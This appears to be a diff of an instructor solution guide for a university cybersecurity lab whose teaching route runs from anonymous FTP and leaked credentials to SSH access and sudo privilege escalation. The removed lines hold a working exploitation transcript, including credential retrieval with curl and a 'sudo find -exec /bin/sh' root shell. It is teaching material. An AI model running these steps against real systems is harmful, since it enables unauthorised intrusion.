@@ -2,174 +2,107 @@
 
 ## Purpose
 
-AP-01 is the first verified CAV-CSF attack path. It provides a short, dependable exercise linking network enumeration, anonymous FTP, credential exposure and reuse, SSH initial access, sudo enumeration and Linux privilege escalation.
+AP-01 is an internal identifier for a verified teaching route linking network enumeration, anonymous FTP, credential exposure/reuse, SSH initial access, sudo enumeration and Linux privilege escalation.
 
 This guide contains solution information and must not be issued as the student brief.
 
-## Implemented Path
+The canonical delivery and runtime rules are defined in `docs/runtime-and-delivery-model.md`.
+
+## Important Runtime-Naming Rule
+
+`AP-01` is a repository/instructor label only. It must not appear in the final VM as a service name, directory, hostname, share, process or other student-visible runtime artefact.
+
+Likewise, development names such as `cav-csf-linux` or `cav-csf-teaching-ssh.service` should not be treated as final student-facing runtime names. Before release, use plausible organisational/operational names consistent with the Brightleaf scenario and normal Linux conventions.
+
+## Implemented Route
 
 ```text
 Anonymous FTP on TCP 21
-  -> Brightleaf stockroom handover document
-  -> generated stockroom credentials
+  -> Brightleaf operational handover/support document
+  -> low-privilege stockroom credentials
   -> teaching SSH on TCP 22
   -> NOPASSWD /usr/bin/find
   -> effective UID 0
 ```
 
-Administrative SSH is a separate key-only service on TCP 22222. The `stockroom` password must fail against it.
+Administrative SSH remains separate from the teaching surface and must not accept teaching credentials.
 
-## Prerequisites
+## Teaching Purpose
 
-- The CAV-CSF VM is attached only to the approved isolated teaching network.
-- The `AP-01 verified` VMware snapshot exists.
-- Instructor administration uses TCP 22222 and an SSH key.
-- The student or Kali system can reach the VM on TCP 21 and TCP 22.
-- `sudo ./scripts/verify-ap01.sh` returns `RESULT: PASS`.
+AP-01 is deliberately a configuration/credential path rather than a CVE path. It is retained because it teaches important weaknesses:
+
+- anonymous service exposure;
+- sensitive information disclosure;
+- credential reuse;
+- remote access with recovered credentials;
+- sudo enumeration;
+- unsafe delegated command execution.
+
+This does not establish a project-wide preference for misconfiguration. Future service-exploitation activities should prefer genuine CVEs where practical, as defined in `docs/vulnerabilities.md`.
 
 ## Student Starting Information
 
-Provide:
+Provide only what is appropriate for the module, typically:
 
-- the authorised target VM address, or the subnet if host discovery is an assessed objective;
-- the student brief in `docs/ap01-student-lab.md`;
-- assessment evidence and reporting requirements;
-- the lab rules of engagement.
+- the authorised target VM address or subnet;
+- the relevant student brief;
+- evidence/reporting requirements;
+- rules of engagement.
 
-Do not provide the generated `stockroom` password. Do not identify the handover filename unless additional scaffolding is required.
+Do not provide the recovered password or exact clue location unless additional scaffolding is deliberately required.
 
-## Expected Route
+## Expected Observations
 
-The exact scanning and FTP client commands may vary. The intended observations are:
+1. TCP 21 exposes an FTP service with anonymous read access.
+2. A plausible operational document exposes a low-privilege credential.
+3. The credential authenticates to student-facing SSH on TCP 22.
+4. `id` confirms a non-administrative local account.
+5. `sudo -l` exposes the intended unsafe `/usr/bin/find` delegation.
+6. The learner demonstrates effective UID 0 and records evidence.
 
-1. TCP 21 exposes vsftpd with anonymous read access.
-2. The anonymous FTP root contains an accidentally published internal service-desk export, `support-ticket-BL-48217.txt`.
-3. The closed ticket records a temporary local profile and phrase created during a warehouse-terminal incident. These are the generated `stockroom` credentials.
-4. Those credentials authenticate to teaching SSH on TCP 22.
-5. `id` confirms a non-administrative local account.
-6. `sudo -l` exposes the exact `/usr/bin/find` NOPASSWD rule.
-7. The learner uses the delegated `find` command-execution feature to run a controlled identity check or obtain the intended root shell.
+## Instructor Verification
 
-### Live-Tested Exploitation Transcript
+Instructor/development verification should confirm:
 
-The route below was executed end-to-end from a Kali attacker VM against the reference CAV-CSF VM (`192.168.200.137`) on 3 August 2026, as an approved instructor-controlled validation pass. The generated `stockroom` password is instance-specific and shown here as `<TEACHING_PASSWORD>`; it changes on every install/reset and must never be committed to the repository or issued to students.
+- FTP is listening;
+- anonymous access works as intended;
+- the clue is present and consistent with protected credential state;
+- the teaching credential authenticates to the intended SSH service;
+- it does not authenticate to administrative SSH;
+- the teaching account lacks unintended administrative group membership;
+- the intended sudo rule exists and is syntactically valid;
+- the approved privilege-escalation route works;
+- no teaching/repository identifier leaks into final runtime names after release migration.
 
-**1. Recon**
+Verification is a development/instructor concern and must not expose active credentials in output.
 
-```text
-$ nmap -sV -p21,22,80,2121,22222 192.168.200.137
-PORT      STATE SERVICE VERSION
-21/tcp    open  ftp     vsftpd 3.0.5
-22/tcp    open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.5
-80/tcp    open  http    Apache httpd 2.4.66 ((Ubuntu))
-2121/tcp  open  ftp     ProFTPD 1.3.5
-22222/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.5
-```
+## Recovery During Development
 
-**2. Anonymous FTP clue**
+Any existing `reset-ap01.sh` or similar script is an instructor/development recovery utility only. It must not be documented or presented as a student activity-reset feature.
 
-```text
-$ curl -s ftp://192.168.200.137/support-ticket-BL-48217.txt
-...
-    profile: stockroom
-    temporary phrase: <TEACHING_PASSWORD>
-...
-```
+Students start from a fresh copy of the completed VM. If a student VM is damaged, the normal recovery approach is to replace it with a fresh copy.
 
-**3. Teaching SSH access and enumeration**
+During active development, use temporary VMware snapshots for short-term rollback. Use full clones for permanent phase milestones.
 
-```text
-$ ssh stockroom@192.168.200.137
-stockroom@192.168.200.137's password: <TEACHING_PASSWORD>
-stockroom@cav-csf-linux:~$ id
-uid=1001(stockroom) gid=1001(stockroom) groups=1001(stockroom)
-stockroom@cav-csf-linux:~$ sudo -l
-User stockroom may run the following commands on cav-csf-linux:
-    (root) NOPASSWD: /usr/bin/find
-```
+## Release Check
 
-**4. Privilege escalation**
+Before the final VM is distributed:
 
-```text
-stockroom@cav-csf-linux:~$ sudo /usr/bin/find /dev/null -maxdepth 0 -exec /usr/bin/id -u \;
-0
-stockroom@cav-csf-linux:~$ sudo /usr/bin/find /dev/null -maxdepth 0 -exec /bin/sh \;
-# id
-uid=0(root) gid=0(root) groups=0(root)
-# whoami
-root
-# exit
-```
-
-This confirms the complete chain works exactly as designed, from unauthenticated network recon through to a real root shell, with no deviation from the documented route.
-
-For a shell-based demonstration, students may use the same documented command-execution property, confirm `id`, collect evidence and exit immediately. They must not create persistence or modify administrator material.
-
-## Instructor Validation
-
-Run from the repository root through administrative SSH on TCP 22222:
-
-```bash
-sudo ./scripts/verify-ap01.sh
-```
-
-The verifier checks:
-
-- FTP listening and safe anonymous-root ownership;
-- anonymous retrieval of the clue;
-- consistency between the clue and protected credential state;
-- teaching SSH authentication;
-- rejection of teaching credentials by administrative SSH;
-- absence of `sudo` and `adm` group membership;
-- exact sudoers syntax and rule scope;
-- controlled execution with effective UID 0.
-
-The verifier does not print the active password.
-
-## Reset Between Uses
-
-Run:
-
-```bash
-sudo ./scripts/reset-ap01.sh
-```
-
-Reset terminates `stockroom` processes, restores its home directory, restores the anonymous FTP clue, reapplies the current generated password, restores the exact sudo rule, restarts the teaching services and runs verification.
-
-The normal reset retains the current generated credential so that the protected instructor state and published clue remain consistent. A fresh install generates a new credential.
-
-## Troubleshooting
-
-### Administrative connection fails
-
-Confirm the client uses TCP 22222 and the administrative private key. Do not weaken teaching SSH or enable the administrator on TCP 22.
-
-### Anonymous FTP returns an access error
-
-Confirm `/srv/ftp` is owned by `root:root` with mode `0755`, then run the reset script. vsftpd refuses an anonymous chroot root that is writable by the anonymous account.
-
-### Teaching SSH is unavailable
-
-Check `cav-csf-teaching-ssh.service` and verify that administrative SSH has not reclaimed TCP 22.
-
-### Verification reports credential inconsistency
-
-Run the reset script. Do not manually copy a password into the repository or student documentation.
-
-### Recovery is uncertain
-
-Keep the TCP 22222 administrative session open. If the documented reset cannot restore the path safely, revert to the `AP-01 verified` VMware snapshot.
+- ensure no AP-01-labelled runtime artefacts are visible;
+- ensure the hostname and service names are realistic rather than repository-derived;
+- verify the complete route from a Kali attacker system;
+- verify administrative access remains separate;
+- preserve the internal mapping only in instructor documentation.
 
 ## Marking Guidance
 
-Evidence should demonstrate the complete reasoning chain rather than only a root shell. Suggested areas are:
+Evidence should demonstrate reasoning rather than only a root shell. Relevant areas include:
 
-- accurate scope and reconnaissance;
-- identification and explanation of anonymous FTP exposure;
-- handling of exposed credentials and proof of SSH access;
-- correct local and sudo enumeration;
-- controlled privilege-escalation evidence;
-- risk explanation and remediation quality;
+- accurate reconnaissance;
+- explanation of anonymous FTP exposure;
+- handling of recovered credentials;
+- proof of SSH access;
+- local and sudo enumeration;
+- controlled privilege escalation;
+- risk explanation and remediation;
 - professional evidence handling and password redaction.
-
-Stronger postgraduate submissions should discuss compound risk, trust-boundary failures, alternative mitigations, monitoring opportunities and why an individually simple weakness can become serious when chained.
